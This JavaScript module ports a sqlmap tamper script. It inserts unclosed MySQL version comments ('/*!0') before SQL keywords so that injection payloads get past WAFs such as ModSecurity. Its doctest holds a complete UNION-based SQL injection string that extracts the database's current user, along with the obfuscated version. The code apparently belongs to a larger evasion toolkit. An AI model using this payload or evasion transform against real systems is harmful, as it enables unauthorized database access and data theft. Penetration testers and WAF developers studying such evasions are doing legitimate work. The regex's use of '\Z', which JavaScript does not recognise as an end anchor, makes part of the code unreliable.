// 上游形态变体（T-6，对标 sqlmap 1.10.10 halfversionedmorekeywords.py，面向 MySQL < 5.1）：
// 在关键词前插 `/*!0` 且**不闭合**——上游 doctest 全程没有 `*/`，整段尾巴处于版本注释内。
// 与本仓 halfversionedmorekeywords（`/*!50540 KEYWORD*/` 逐词闭合带空格）形态完全不同族。
// 排除 IGNORE_SPACE_AFFECTED_KEYWORDS（CAST( 在上游 doctest 里不被前插正是这条排除集）。
// 是否替换默认，由 modsec-live 真机 A/B 定 ⇒ 本件不动默认链（批次 D13）。
import { SQL92_KEYWORDS, IGNORE_SPACE_AFFECTED_KEYWORDS } from '../upstreamKeywords.js';

export const halfversionedmorekeywordsopen = {
  name: 'halfversionedmorekeywordsopen',
  description: '在关键词前前插不闭合的 /*!0（上游形态，注释保持打开至句尾；MySQL < 5.1 版本注释）',
  doctests: [
    {
      input: "1' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa",
      output: "1'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa",
    },
  ],
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const out = String(payload ?? '').replace(
      /(?:^|(?<=\W))([A-Za-z_]+)(?=\W|\Z)/g,
      (word) => {
        const up = word.toUpperCase();
        return (SQL92_KEYWORDS.has(up) && !IGNORE_SPACE_AFFECTED_KEYWORDS.has(up)) ? `/*!0${word}` : word;
      }
    );
    return out.replace(/ \/\*!0/g, '/*!0');
  },
};

export default halfversionedmorekeywordsopen;
